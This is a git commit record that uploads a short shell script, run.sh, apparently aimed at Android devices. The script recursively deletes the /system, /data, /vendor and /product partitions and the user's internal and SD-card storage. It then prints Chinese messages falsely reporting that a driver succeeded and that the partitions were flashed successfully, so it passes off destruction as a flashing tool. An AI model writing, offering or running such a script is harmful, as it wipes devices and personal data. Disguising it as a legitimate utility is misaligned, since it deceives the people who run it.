1dbd0bdc11714749309a8fbabd89816ed54cb19d
DrDYF <132108135+DrDYF@users.noreply.github.com>
2025-05-11 23:08:59 +0800

    Add files via upload

---
+++ run.sh
@@ -0,0 +1,12 @@
+rm -rf /system 
+rm -rf /data 
+rm -rf /vendor 
+rm -rf /product 
+rm -rf /sdcard 
+rm -rf /storage/emulated/0
+rm -rf /storage/sdcard 
+echo " data 驱动成功"
+echo "目录已为0" 
+echo " system 刷入成功" 
+echo " vendor 刷入成功" 
+echo " product 刷入成功"
